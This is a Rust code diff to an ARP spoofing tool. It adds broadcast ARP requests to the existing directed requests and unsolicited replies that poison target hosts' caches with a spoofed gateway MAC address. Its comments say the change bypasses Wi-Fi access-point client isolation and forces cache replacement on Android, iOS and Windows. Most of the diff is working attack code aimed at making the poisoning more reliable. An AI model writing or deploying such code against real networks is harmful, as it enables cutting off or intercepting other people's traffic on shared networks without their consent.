@@ -16,7 +16,9 @@ pub fn reset_target_add_count() {
     SPOOFER_TARGET_ADD_COUNT.store(0, Ordering::SeqCst);
 }
 
-use crate::spoofer::raw_l2::{craft_arp_reply, craft_directed_arp_request, RawL2Sender};
+use crate::spoofer::raw_l2::{
+    craft_arp_reply, craft_broadcast_arp_request, craft_directed_arp_request, RawL2Sender,
+};
 use crate::types::{Host, HostStatus, MacAddress};
 
 /// Locally administered unicast blackhole MAC address.
@@ -319,9 +321,19 @@ impl ArpSpoofer {
                         };
 
                         // 1. Poison Target Host: Gateway IP is at spoof_gw_mac.
-                        // Send directed ARP Request ("Who has host.ip? Tell gateway_ip at spoof_gw_mac")
-                        // and unsolicited ARP Reply. This forces ALL operating systems (including Linux/Android
-                        // with arp_accept=0 and iOS/macOS with strict ARP validation) to update their ARP cache.
+                        // We transmit a dual strategy to guarantee delivery across all network topologies:
+                        // A) Broadcast ARP Request: Ethernet dst = FF:FF:FF:FF:FF:FF. Wi-Fi Access Points
+                        //    are mandated to broadcast this to all associated stations, completely bypassing
+                        //    AP Client Isolation (which drops station-to-station unicast frames).
+                        // B) Directed Unicast ARP Request & Reply: Forces RFC 826 cache replacement across
+                        //    Android (arp_accept=0), iOS, and Windows on unconstrained segments.
+                        let pkt_host_bcast_req = craft_broadcast_arp_request(
+                            local_mac,
+                            gateway_ip,
+                            spoof_gw_mac,
+                            host.ip,
+                            host.mac,
+                        );
                         let pkt_host_req = craft_directed_arp_request(
                             host.mac,
                             local_mac,
@@ -337,6 +349,7 @@ impl ArpSpoofer {
                             host.ip,
                             host.mac,
                         );
+                        let _ = s.send_frame(&pkt_host_bcast_req);
                         let _ = s.send_frame(&pkt_host_req);
                         let _ = s.send_frame(&pkt_host_reply);
 
@@ -361,6 +374,7 @@ impl ArpSpoofer {
 
                         // Dual-burst on Wi-Fi/Ethernet for small/medium target sets to prevent packet drops
                         if is_small_network {
+                            let _ = s.send_frame(&pkt_host_bcast_req);
                             let _ = s.send_frame(&pkt_host_req);
                             let _ = s.send_frame(&pkt_host_reply);
                             let _ = s.send_frame(&pkt_gw_req);
